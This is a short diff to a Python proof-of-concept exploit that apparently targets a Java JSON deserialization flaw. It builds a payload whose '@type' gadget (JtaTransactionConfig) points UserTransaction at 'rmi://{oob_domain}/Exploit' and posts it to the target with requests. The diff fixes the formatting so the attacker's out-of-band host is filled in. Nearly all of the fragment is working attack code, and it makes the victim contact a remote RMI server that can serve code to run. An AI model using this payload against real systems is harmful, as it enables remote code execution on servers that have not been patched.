@@ -46,9 +46,9 @@ def poc(url):
    "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
    "properties":{
       "@type":"java.util.Properties",
-      "UserTransaction":"rmi://oob_domain/Exploit"
+      "UserTransaction":"rmi://{oob_domain}/Exploit"
    }
-}"""
+}""".format(oob_domain=oob_domain)
         headers = {'Content-Type': 'application/json'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
